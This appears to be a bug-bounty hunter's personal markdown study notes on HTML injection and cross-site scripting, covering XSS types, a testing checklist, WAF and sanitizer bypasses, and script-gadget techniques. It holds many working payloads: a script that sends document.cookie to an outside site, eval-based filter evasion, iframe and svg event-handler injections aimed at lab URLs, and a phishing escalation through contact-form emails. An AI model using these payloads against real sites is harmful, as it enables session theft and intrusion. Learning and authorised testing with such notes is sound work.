


# HTML injection 

- let you inject html tags in input fields and parameters and it applied in the web page, because the back end does not encode the special characters like `></"` 
- its impact is low
- it can be escalated to many serious vulns like `xss`

## Notes
- the input fields maybe for get method, so the parameters will appear in the URL , and may exist hidden parameters sent from the web page itself `you can edit it`
- If you found POST request with JSON data form , try to change its data and inject in it HTML tags
- sometimes the parameters not just required as text from the user it may using a `select` list, or any thing like that
- the parameter maybe hidden so you can edit on it from the burp 
- if you changed the size of the container so the size of the  children will effected too
	- like when you change the size of the window so all of the elements will effected

## Ideas From Write-ups:

-  If there is page in the website that after input some data, it send to you email, like `contact us` , or any thing will send email for you, try to inject in it, and it will reflect on the email, in a way to high its impact you can add a link for a malicious website, and add email of another someone, so the email with the malicious link will sent to him





## Methodology:
1. Recon
	1. Subdomain
	2. Endpoints/URLs
	3. Requests
	4. Parameters
2. Test the characters
	1. ASCII Characters
	2. `"><\` 
3. Try the payloads

---

# XSS

- escalation of HTML injection by injecting a `JS payload` 
## Types:

- Reflected XSS : `the payload in the source code of the page, URL include pyaload` 

- Stored XSS : `works without the payload in the source code, it may be in the DataBase`

- DOM-based XSS : `it's same Reflected, but the data saved in the borowser using DOM , so the data sent to the Client-side (adding ot the page by DOM) , not to the server-side`

- Blind XSS : `it's like Stored but here you can not see the result , like when you send a message to support and appear "we will call you" message , so here if you inject a XSS payload you will not know if it executed or not`

	- we use many tools for it like `XSS Hunter Express -> began unpaid now and you need a cusom srever` , `XSS.report -> which give you sutiable payloads and infrom you if it excuted and give you its output`  

- Self XSS: `you use social enginnering to trick a victim to use a malicious JS code, whether into DevTools (server fine) , or in input fields in the website so it infected with another type of XSS ` 
- Universal XSS
- Mutated XSS

 - `Source-based`: `Reflected , Stored` -> there is request sent to the  server-side
- `DOM-based` -> there is no request sent , the input just sent to JS code 


## Payloads Notes:

- to customize/craft payload, you have an intention (what you want the payload to do) and modification (changing its format to be executed on different web sites)
	- intention :- 
		- POC `like <script>alert();</script>`
		- Session stealing `like <scirpt>fetch('htpps://webiste.com/?cookie=' + btoa(document.cookie))</script>`
		- keylogger
		- Business logic

- DOM-based XSS Payloads hlep: 
	- Source : `the injection point` sink: `the funciton that will achieve my injeciton point`
- while writing the payload, if you find anything after injecting you payload will cause to execution failed , put it in comment like `// '; `
- there is payloads calling scripts from another source like `<Svg OnLoad=import('//x55.is')>`
- `onmouseover` useful payload
- nice example `<a href="#" onclick="alert('XSS')">Click Me</a>`
- while Crafting Payloads to bypass the sanitizers 
	- you can use `eval()` with the Detectors which detect the famous functions
		- you can divide the function with two strings in two variables like
			- `<script>var x="ale";var y="rt(13)"; eval(x+y);</script>`
			- `<script>eval("al"%2b"ert(12)");</script>`
			- `<script>eval(/ale/.source%2b/rt(45)/.source)</script>`
			- `<script>var x=/alert/.source;eval(x+"(125)"); </script>`
		- and so on, using this notation `/ /.source` and eval function
- Also you can use `JSfuck` to encode the `JS` payload but, be careful while sending it, make it `url` encoded to let the browser and the server understand it
- best mitigation is using `specail character encoding`
- be careful while using the html encoding, make sure that it renders in HTML context not in `scrip` tag due to the `JS` will not understand this
- use `JSFuck` to inject the payload as it
- do not let any quotes around, just close it 
	- like when you find there is `"` will be there alone after injecting your payload
	- try to make it `paylaod x=""` so it became a valid attribute 
- use `DOMLoadedContent` event listener, to trigger your payload after all the page loaded 

## Notes:

1. `document.onkeypress`:  `contain the bottun that pressed`

2. Inputs which handled with DOM does not appear in the page source , because it does not come from back end , it's handled by JS with DOM
	1. like when the value you entered saved in the variable and the variable passed to sink , so the actual value will not appear

3. in HTML tags you can add any attribute as you want and if it valid will run otherwise it will not

4. I can inject the payloads in the fragment, it does not sent to the server by default, it manipulated with DOM in the page, `location.hash` indicate to it, so if you assigned it to any Dangerous DOM API.

5. the impact of `post-based XSS (type of Stored)` is low, because it needs to upgrade it to more harmful impact, mixing it with another vulnerability, same for `Self XSS`

6. you can bypass the WAF which sanitize the payload with some tricks like
	1. `<scr<script>ipt> alert('xss') </scr</script>ipt>`

7. in URL you can use pseudo-protocol `javascript:` which is consider `JS wrapper` for writing JS in the URL, and it used in HTML in attributes or tags which require URL like `href , src , .....`

8. `Dom-based XSS Note` : it's easiest to close the tag and write a new tag with your injection point
,
9. `Dom-based XSS Note` : when you find the injection point will injected in tag `like containers`, if it carry id or class , it may for make the encoding so the payload will not work, so close the tag and open new one for the closing tag in the back.
	1. `</span><span><svg onload=alert(1)>`

10. 

11. Reflected post-based XSS, not exploitable because you need to inject the payload in the input field because the parameter does not sent in the URL

12. `URl Reflection`: you can add some characters in the URL, and if there any thing in the page use the url using the JS function so when the function execute it will grep and add also what you added so you can close the tag and inject malicious code

13. search about images which injected in it XSS payloads, and if there is website that support image upload `like as your photo of your account` upload it.
14. 
15. is there any ticket or feedback from `which no one will see it but the admins` , try Blind XSS with this `xss.report` 
16. IF there is a container object which carry specific tags like `ul -> li , select -> opetion .....` , when you inject the payload close the whole carrier and then inject the `POC`
17. there is download parameter in `<a>` to download something when the user access the website.
18.  `-alert()-` the dash is used to concatenation.
19. in `JSON` the default behavior if it carries any quotes it will write it as escaped character `\"`
20. look for the `JS` technology, like angular, even the security constraints is applied like validation , encoding , `sanitization`. maybe there is a vulnerability in the technology itself.
21. the input which sent in the parameters in the website need to be decoded in the server to recognize your input.
22. `cookie-based xss` consider `self-xss` because it just in the user cookies and can not affect the other users, but I can convert it to `stored xss` by nice trick , if there is also `Reflected xss` , so i can send the link to the user and the link carry `JS` payload that create a malicious cookie in the user browser and due to many websites some of the cookies values reflect in it , the vulnerability began `sotred xss` 
23. alternative to `autofocus` I can use the fragment to determine which element will be focused by adding in the end of URL `#"id-of-the-element"` 
24. if i affected on `iframe` with the payload in the specific page, it's low severity `xss` cause the `iframe` is `sandboxed`  so the `SOP` is different so you can not access sensitive data from the real page
25. in most times the developer use built-in function in the language to encode the characters, so you can not bypass the html encoding unless you found a bug in the function which he use
26. do not use `<img>` to inject a `JS` code
	1. it just send a GET request, and if the response not a image, it fail, so it will not execute the `JS`
	2. otherwise in case of `CRLF` injection, you here the inject in the server not in the web page so it will work
27. 

# Useful Ideas 

7. if you encountered any `WAF`, try to double encode the payload 
8. if the response come from the server as a `JSON` and it assigned to a variable using a `eval` (so the developer does not use `JSON.parse()`) so if you injected any` JS` code in the `JSON` it will execute in the `eval`
9. maybe the developer used a misconfiguared method to encode the HTML characters, like using method encode only the first appearance of the characters.
	1. example for the exploitation :- `{"result" : [],"Query" : "\\"}alert(2)\"}`
10.     In `php files` you can add the payload in the `URL` itself , not just in the parameter `but it just back to the nature of the language itself` 
	1. it's the file which manipulate with from in html file, so the `url` written in `action=` attribute in `form` tag , so when you add the closing tag and inject new one, it will be displayed in the source code and ran 
	2. `https://domain.com/dir/file.php/"><svg onload=alert()>` -> for example
	3. the culprit in `php` usually be `$_SERVER["PHP_SELF"]`
11. when you test the `probe` enter only one special character at a time 
12. try to add `</div> </span>`  in the first of your payload because you maybe inject inside div marked with class to be sanitized.
13. while testing if you found the method of filtration done in `client-side` , it may be instantaneous while writing the character so if you entered special character it will be deleted while writing like using `addEventListener` , you can add the input using the `DOM` like `document.queryselector('nameOfTheNode').value= TheInput;`
14. bypass method `<sCrIpT>`
15. `Dom-based XSS Note:` you can use `iframe` to load a new page with another or same URL, an inject payload `onload` or `onerror` or anything, like:
	1. `<iframe src="https://0a5b008e033d60f081371bb600c70046.web-security-academy.net/#" onload="this.src+='<svg onload=print() >'"> </iframe>`
	2. you can use `this` to indicate to the tag which you in and update or add anything like above
	3. `<iframe src="https://0af1004e03e8a8cd82e4a78500f100ed.web-security-academy.net/?search=<body+onresize=print()>" onload='this.style="width: 400px;" '>`
16. `svg` tags work only inside `svg` tag like this payload
	1. `<svg><animateTransform onbegin=alert()>` 
	2. notice that `onbegin` event work just with `animate animateTransform set` and some else
17. `- "><img/src="x"/onerror=prompt(1)>` nice payload here he replaced spaces with /
18. search for apps which provide writing html tags, and does not sanitize the input properly
19. all events fire with custom tag, but the `focus autofocus blur ...` all events which run with focusable tags like `input buttons links textarea ...`, it will not run till be focusable by adding `tabindex='0' or tabindex='-1'` 
20. try to uppercase many characters from your work, sometimes the sanitizers does not work correctly `like regex sanitize https , but if i input HTTPS it will bypass and still work`
21. replace ` ` with `/` or sometimes in the attribute context you can write them concatenated without needing to spaces to separate them
22. note that if the request `content-type` include html  or js or not 

```
Hunting on XSS
---------------------------
start with VDP programs:
- Do not start making account and all that, just do Recon,
and enumrate the parameters

- and when you get burnout from these methodology get in the app,
and try the funcionality by yourself

----------------------------------------------------------

New Notes From the Write-UPs:

- use external payloads like "https://x55.is"

- sometimes try to doubly close the tags like ">><img

- use doubly encoding for payloads to bypass the WAFs

- open the burp HTTP history and filter the requests by the domain,
to be able to enemurate the requests after that 
------------------------------------------------

NASA , NOKIA


```


---
# Methodology:

>always look to your notes while testing

- [ ]  Find all Subdomains, If you work on `Wild card`
- [ ] gather all endpoints
- [ ] know the website technologies
- [ ] work on parameterized URLs
	- [ ] search for `hidden` parameters.
	- [ ] Try Inject `alphanumirec` Data, and see if it reflection in the website
	- [ ] if it reflects see it in the source code
		- [ ] if you found it, try inject probe `><"/\` 
		- [ ] use burp to bypass the client side validation 
		- [ ] try some Payloads, and try to bypass the `WAF` if there is one 
		- [ ] and try to test your `POC`  
	- [ ] if you did not find it in the source code, search for `JS` file or code and trace it
	- [ ] if you found any dangerous sink, see if it assigned to dangerous source, and try`DOM-Based`
	- [ ] inject your `POC`
	- [ ] see if it Stored in the page, so it's `Stored XSS` 
		- [ ] see if there is response back in `JSON` try to inject in it
		- [ ] it also maybe `Stored Dom-based XSS` 
	- [ ] see the requests in the burp and try manipulate with it without the website
- [ ] work on URLs which finish with static file `/file.ext` 
	- [ ] Retest again like above on `Stored` in forums or comment or profile fields 
	- [ ] find if there is any file upload function, and upload file its name is the payload
	- [ ] `URL path segments` In path of the URL replacing each folder, `subfolder` and page, one at a time.
	- [ ] 
- [ ] work on the normal URLs 
	- [ ] retest the above things
- [ ] if there is tickets or anything visible for the admins try `Blind XSS`


# Important Notes:
- [ ] when you injecting in search bar, try put before the payload something already exist, that may make the payload reflect 
- [ ] Use the Intruder, if you will test multiple tags or payloads
- [ ] Try bypass sanitizers with non-popular tags like `<math> <iframe> <svg>`
- [ ] Try the same payload in multiple places (URL, form, headers) — some pipelines sanitize differently.
- [ ] see the Framework notes 
- [ ] look for `wayback` machine
- [ ] Try inject in fragments
- [ ] try to add `</div> </span>`  in the first of your payload because you maybe inject inside div marked with class to be sanitized.
- [ ] `URL reflection` what happening when you add the malicious code in the URL and then there is part of the website will use it
- [ ] search about images which injected in it XSS payloads, and if there is website that support image upload `like as your photo of your account` upload it.
- [ ] IF there is a container object which carry specific tags like `ul -> li , select -> opetion .....` , when you inject the payload close the whole carrier and then inject the `POC`
- [ ] maybe there is a vulnerability in the technology itself.
- [ ] when you test the `probe` enter only one special character at a time 
- [ ] some websites which contain parameters indicate to numbers or names of errors maybe vulnerable
- [ ] try to block `JS` if there any `noscript` and test on it
- [ ] inject custom payloads, in websites which sanitize the input
- [ ] if there is chat bot , try inject in it
- [ ] use `//` instead to the full URL in `JS` that will bypass any `WAF` that detect the protocols and the `JS` by default use the protocols
- [ ] try to predict what is the function which used in the back-end to encode and try to find any bug in it online
- [ ] one of the methods to bypass the WAF, try to change the method type


----

XSS notes:

See the reflection context and then determine the bypassing technique, like when you injecting the payload which reflect with URL encoding, why do not submit it with URL encoding 


Not give up after noticing that the characters encoded , search for the technology which the app work , with and search for xss payloads for it and after that test it , remember if you can inject some tags try to inject harmless tag like the div and put the framework attribute controller and then inject in it 


The idea of using the regex to identify the Url and the payload JavaScript: alert()//https://google.com



If you noticed that the reflection happened in JS variable or in JS context , and the main probes blocked like ><";  
You can use many types of encoding like url encoding, unicode encoding , hex encoding


Do not forget to use eval to test with it , if the common functions blocked 

And don't forget to use the string concatenation for the blocked functions 

If you within a JavaScript context and you within a function which didn't call, get out from it 

Beeceptor

If the website uppercase anything you entered, try to inject a external script

If you encountered a CSP , take it's configuration and go to CSP Evaluator to check if there any warnings and see the potential severaty and try to apply it 

![[WhatsApp Image 2025-12-07 at 5.31.20 PM.jpeg]]
Remember if you in JS context like that



### JS Gadgest Notes:

1. 
✅ Don’t stop when `<script>` is blocked.  
Try to inject payloads into **framework attributes** like:

- `data-bind`, `data-xxx`, `title`, `id`, etc.
    
- Then see if any library reads those and treats them as logic or templates.

2. 
When doing tests:

- Don’t only test `<script>`.
    
- Try injecting payloads into **“safe” attributes**:
    
    - `title`, `alt`, `id`, `data-*`.
        
- Then interact with the page (hover, click) and see if anything executes.



3. 
**As a pentester:**

- Always check: does CSP include `'unsafe-eval'`?
    
- If yes → start hunting for script gadgets that use `eval` / `new Function` on data from DOM/attributes.

4. 
Custom template expressions can behave like a hidden `eval`. If you can inject into them, try to break out.

5. 
For you, the important point is:  
👉 This is **very common**, not just a theoretical edge case.

6. 

**Lesson for you as a tester & future dev:**  
Frameworks that separate **data** and **code** and avoid string → code conversions are much harder to exploit.

7. 
   
Here’s a **practical checklist** you can follow when testing a site:

### 8.1 Recon: what libraries/frameworks are used?

- Look in the HTML and JS files for:
    
    - `knockout`, `bootstrap`, `dojo`, `angular`, `vue`, `polymer`, `aurelia`, custom MVVM libs, etc.
        
- Also look for custom attributes:
    
    - `data-bind`, `data-ajax`, `data-template`, `data-*` used heavily.
        

### 8.2 Try “hidden XSS” in attributes instead of `<script>`

When classic XSS payloads get blocked:

1. Inject into:
    
    - `title`
        
    - `alt`
        
    - `data-*`
        
    - `id` (sometimes used in JS selectors + logic)
        
2. Use **simple payloads** first, e.g.:
    
    `"];alert(1);//` 
    
3. Then interact with the page:
    
    - Hover tooltips,
        
    - Click buttons,
        
    - Trigger AJAX/SPA navigation.
        

You’re trying to trigger library code that reads and processes your attribute.

### 8.3 Look at JS sinks if you can see the source

If you can open JS files (non-minified or pretty-printed):

- Search for:
    
    - `eval(`
        
    - `new Function(`
        
    - `setTimeout(` with a **string**
        
    - `innerHTML` + later `<script>` injection
        
- Then:
    
    - See if any of those take input from attributes or DOM that you can influence.
        

This is **exactly** hunting for script gadgets.

### 8.4 Check CSP and adjust your attack

- Look at `Content-Security-Policy` header using DevTools.
    
- If you see:
    
    - `'unsafe-eval'` → target eval/Function gadgets.
        
    - `'strict-dynamic'` → look for gadgets that create new `<script>` tags from DOM content.
        
- Even with strict CSP, still test injection into template expressions and `data-*` attributes
  
  
  8. 
     ### What you did right ✅

- You’re thinking in **expressions**, not `<script>` tags.
    
- `alert('script gadget')` is perfect as a _core payload_.
    

### Next step as a pentester

When you see an attribute like `data-bind="... USER_INPUT ..."`:

1. **View source / Elements tab** to see exactly how your input is embedded:
    
    - Is it: `click: USER_INPUT` ?
        
    - Or: `click: 'USER_INPUT'` ?
        
2. Based on that, you adjust:
    
    - If raw: `alert('script gadget')` is fine.
        
    - If quoted: use a breakout like:
        
        `');alert('script gadget');//` 
        
        or
        
        `");alert('script gadget');//`
        
        
        





